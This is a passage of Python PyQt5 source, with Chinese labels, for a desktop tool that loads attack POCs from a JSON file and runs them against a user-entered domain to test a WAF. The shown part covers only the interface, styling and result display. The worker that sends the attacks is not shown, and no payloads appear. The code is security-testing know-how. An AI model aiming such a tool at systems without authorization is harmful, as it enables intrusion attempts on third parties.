        config_layout.addWidget(self.domain_edit)
        config_layout.addWidget(poc_label)
        config_layout.addWidget(self.poc_edit)
        config_layout.addWidget(poc_btn)
        config_layout.addWidget(report_label)
        config_layout.addWidget(self.report_edit)
        config_layout.addWidget(report_btn)
        main_layout.addWidget(config_group)

        # ========== 2. 中部拆分 ==========
        splitter = QSplitter(Qt.Horizontal)
        splitter.setStyleSheet("QSplitter::handle{background-color: #e0e0e0; width: 3px;}")

        # POC列表区
        poc_group = QGroupBox("POC列表")
        poc_group.setStyleSheet("QGroupBox{font-size:14px; font-weight:bold; margin-top:8px;}")
        poc_layout = QVBoxLayout(poc_group)
        self.poc_table = QTableWidget()
        self.poc_table.setColumnCount(4)
        self.poc_table.setHorizontalHeaderLabels(["POC ID", "名称", "攻击类型", "执行状态"])
        self.poc_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeToContents)
        self.poc_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
        self.poc_table.horizontalHeader().setSectionResizeMode(2, QHeaderView.ResizeToContents)
        self.poc_table.horizontalHeader().setSectionResizeMode(3, QHeaderView.ResizeToContents)
        self.poc_table.setStyleSheet(self.get_table_style())
        poc_layout.addWidget(self.poc_table)
        splitter.addWidget(poc_group)

        # 日志区
        log_group = QGroupBox("测试日志")
        log_group.setStyleSheet("QGroupBox{font-size:14px; font-weight:bold; margin-top:8px;}")
        log_layout = QVBoxLayout(log_group)
        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setStyleSheet(self.get_log_style())
        clear_log_btn = QPushButton("清空日志")
        clear_log_btn.setStyleSheet(self.get_btn_style_small())
        clear_log_btn.clicked.connect(self.clear_log)
        log_layout.addWidget(clear_log_btn, alignment=Qt.AlignRight)
        log_layout.addWidget(self.log_text)
        splitter.addWidget(log_group)

        splitter.setSizes([400, 600])
        main_layout.addWidget(splitter)

        # ========== 3. 控制区 ==========
        control_layout = QHBoxLayout()
        control_layout.setSpacing(15)

        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setValue(0)
        self.progress_bar.setStyleSheet(self.get_progress_style())
        control_layout.addWidget(self.progress_bar)

        self.start_btn = QPushButton("开始测试")
        self.start_btn.setStyleSheet(self.get_btn_style())
        self.start_btn.setMinimumWidth(100)
        control_layout.addWidget(self.start_btn)

        self.stop_btn = QPushButton("停止测试")
        self.stop_btn.setStyleSheet(self.get_btn_style_danger())
        self.stop_btn.setMinimumWidth(100)
        self.stop_btn.setEnabled(False)
        control_layout.addWidget(self.stop_btn)

        main_layout.addLayout(control_layout)

        # 绑定信号
        self.start_btn.clicked.connect(self.start_test)
        self.stop_btn.clicked.connect(self.stop_test)
        self.log_handler.log_signal.connect(self.append_log)

        return widget

    # 样式方法（复用）
    def get_edit_style(self) -> str:
        return """
            QLineEdit{
                padding: 8px 10px;
                border: 1px solid #dcdfe6;
                border-radius: 6px;
                font-size:12px;
            }
            QLineEdit:focus{
                border-color: #409eff;
                outline: none;
            }
        """

    def get_btn_style(self) -> str:
        return """
            QPushButton{
                background-color: #409eff;
                color: white;
                border: none;
                border-radius: 6px;
                padding: 8px 16px;
                font-size:12px;
                font-weight:500;
            }
            QPushButton:hover{
                background-color: #66b1ff;
            }
            QPushButton:pressed{
                background-color: #337ecc;
            }
            QPushButton:disabled{
                background-color: #c0c4cc;
            }
        """

    def get_btn_style_small(self) -> str:
        return """
            QPushButton{
                background-color: #e6e9ec;
                color: #606266;
                border: none;
                border-radius: 4px;
                padding: 4px 8px;
                font-size:11px;
            }
            QPushButton:hover{
                background-color: #dcdfe6;
            }
        """

    def get_btn_style_danger(self) -> str:
        return """
            QPushButton{
                background-color: #f56c6c;
                color: white;
                border: none;
                border-radius: 6px;
                padding: 8px 16px;
                font-size:12px;
                font-weight:500;
            }
            QPushButton:hover{
                background-color: #f78989;
            }
            QPushButton:pressed{
                background-color: #e45656;
            }
            QPushButton:disabled{
                background-color: #c0c4cc;
            }
        """

    def get_table_style(self) -> str:
        return """
            QTableWidget{
                border: 1px solid #e6e6e6;
                border-radius: 6px;
                background-color: white;
                gridline-color: #f0f0f0;
            }
            QTableWidget::item{
                padding: 6px;
            }
            QTableWidget::item:selected{
                background-color: #e5f0ff;
                color: #606266;
            }
            QHeaderView::section{
                background-color: #f8f9fa;
                border: none;
                border-bottom: 1px solid #e6e6e6;
                padding: 8px;
                font-weight:bold;
            }
        """

    def get_log_style(self) -> str:
        return """
            QTextEdit{
                border: 1px solid #dcdfe6;
                border-radius: 6px;
                background-color: white;
                padding: 10px;
                font-family: "Consolas", "Microsoft YaHei", sans-serif;
                font-size:11px;
                color: #333;
            }
        """

    def get_progress_style(self) -> str:
        return """
            QProgressBar{
                border: 1px solid #dcdfe6;
                border-radius: 6px;
                background-color: white;
                height: 24px;
                text-align: center;
            }
            QProgressBar::chunk{
                background-color: #409eff;
                border-radius: 5px;
            }
        """

    # 测试功能方法（复用）
    def append_log(self, msg: str):
        self.log_text.append(msg)
        self.log_text.moveCursor(self.log_text.textCursor().End)

    def clear_log(self):
        self.log_text.clear()

    def select_poc_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "选择POC JSON文件", "", "JSON文件 (*.json);;所有文件 (*.*)"
        )
        if file_path:
            self.poc_edit.setText(file_path)
            self.load_poc_to_table(file_path)

    def select_report_path(self):
        file_path, _ = QFileDialog.getSaveFileName(
            self, "保存测试报告", "./waf_test_report", "所有文件 (*.*)"
        )
        if file_path:
            self.report_edit.setText(file_path)

    def load_poc_to_table(self, poc_file: str):
        try:
            with open(poc_file, "r", encoding="utf-8") as f:
                poc_list = json.load(f)
            self.poc_table.setRowCount(0)
            for poc in poc_list:
                row = self.poc_table.rowCount()
                self.poc_table.insertRow(row)
                self.poc_table.setItem(row, 0, QTableWidgetItem(poc.get("poc_id", "unknown")))
                self.poc_table.setItem(row, 1, QTableWidgetItem(poc.get("name", "unknown")))
                self.poc_table.setItem(row, 2, QTableWidgetItem(poc.get("attack_type", "unknown")))
                self.poc_table.setItem(row, 3, QTableWidgetItem("未执行"))
                self.poc_table.item(row, 3).setForeground(QBrush(QColor("#909399")))
        except Exception as e:
            QMessageBox.warning(self, "警告", f"加载POC列表失败: {str(e)}")

    def start_test(self):
        target_domain = self.domain_edit.text().strip()
        poc_file = self.poc_edit.text().strip()
        report_path = self.report_edit.text().strip()

        if not target_domain:
            QMessageBox.warning(self, "警告", "请输入目标域名！")
            return
        if not poc_file or not os.path.exists(poc_file):
            QMessageBox.warning(self, "警告", "请选择有效的POC文件！")
            return

        self.progress_bar.setValue(0)
        self.clear_log()
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)

        self.worker = WafTestWorker(target_domain, poc_file, report_path)
        self.worker.log_signal.connect(self.append_log)
        self.worker.progress_signal.connect(self.progress_bar.setValue)
        self.worker.result_signal.connect(self.update_poc_status)
        self.worker.finish_signal.connect(self.test_finish)
        self.worker.start()

    def stop_test(self):
        if self.worker and self.worker.isRunning():
            self.worker.stop()
            self.stop_btn.setEnabled(False)

    def update_poc_status(self, result: dict):
        for row in range(self.poc_table.rowCount()):
            if self.poc_table.item(row, 0).text() == result["poc_id"]:
                if result["status"] == "pass":
                    self.poc_table.setItem(row, 3, QTableWidgetItem("通过"))
                    self.poc_table.item(row, 3).setForeground(QBrush(QColor("#67c23a")))
                elif result["error_msg"]:
                    self.poc_table.setItem(row, 3, QTableWidgetItem("异常"))
                    self.poc_table.item(row, 3).setForeground(QBrush(QColor("#f56c6c")))
                else:
                    self.poc_table.setItem(row, 3, QTableWidgetItem("失败"))
                    self.poc_table.item(row, 3).setForeground(QBrush(QColor("#e6a23c")))
                break

    def test_finish(self, report: dict):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        total = report["total_poc"]
        pass_count = report["pass_count"]
        fail_count = report["fail_count"]
        error_count = report["error_count"]
        QMessageBox.information(
            self, "测试完成",
            f"总用例数: {total}\n通过数: {pass_count}\n失败数: {fail_count}\n错误数: {error_count}\n准确率: {report['accuracy']}"
        )

# ===================== 程序入口 =====================
if __name__ == "__main__":
    # 补充QInputDialog导入（批量选择时用）
    from PyQt5.QtWidgets import QInputDialog

    logging.basicConfig(level=logging.INFO)
    app = QApplication(sys.argv)
    font = QFont("Microsoft YaHei", 12)
    app.setFont(font)

    window = WafTestMainWindow()
    window.show()
    sys.exit(app.exec_())